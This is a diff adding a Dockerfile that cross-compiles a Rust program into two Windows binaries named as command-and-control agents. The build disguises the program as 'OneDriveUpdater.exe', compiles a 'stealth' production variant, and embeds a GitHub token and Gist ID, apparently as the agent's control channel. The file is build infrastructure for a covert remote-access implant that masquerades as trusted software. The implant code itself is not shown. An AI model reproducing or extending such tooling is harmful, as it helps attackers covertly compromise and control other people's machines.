@@ -1,0 +1,37 @@
+# Builder stage
+FROM rust:slim AS builder
+
+WORKDIR /usr/src/app
+
+# Install MinGW-w64 for cross-compilation
+RUN apt-get update && \
+    apt-get install -y mingw-w64 && \
+    rm -rf /var/lib/apt/lists/*
+
+# Add Windows target (x86_64 for compatibility with Win11 ARM64 emulation)
+RUN rustup target add x86_64-pc-windows-gnu
+
+# Copy source
+COPY . .
+
+ARG GITHUB_TOKEN
+ARG GIST_ID
+ENV GITHUB_TOKEN=$GITHUB_TOKEN
+ENV GIST_ID=$GIST_ID
+
+# Build Test Agent (Standard)
+RUN cargo build --release --target x86_64-pc-windows-gnu && \
+    mv target/x86_64-pc-windows-gnu/release/OneDriveUpdater-debug.exe target/x86_64-pc-windows-gnu/release/c2_agent_test.exe
+
+# Build Prod Agent (Stealth)
+RUN cargo build --release --target x86_64-pc-windows-gnu --features stealth && \
+    mv target/x86_64-pc-windows-gnu/release/OneDriveUpdater.exe target/x86_64-pc-windows-gnu/release/c2_agent_prod.exe
+
+# Output stage - minimal image to just hold the artifact and copy it out
+FROM debian:bookworm-slim
+WORKDIR /output
+COPY --from=builder /usr/src/app/target/x86_64-pc-windows-gnu/release/c2_agent_test.exe .
+COPY --from=builder /usr/src/app/target/x86_64-pc-windows-gnu/release/c2_agent_prod.exe .
+
+# When run, copy artifacts to the mounted volume
+CMD ["sh", "-c", "cp /output/* /shared/ && echo 'Agent compiled and copied to /shared' && sleep infinity"]
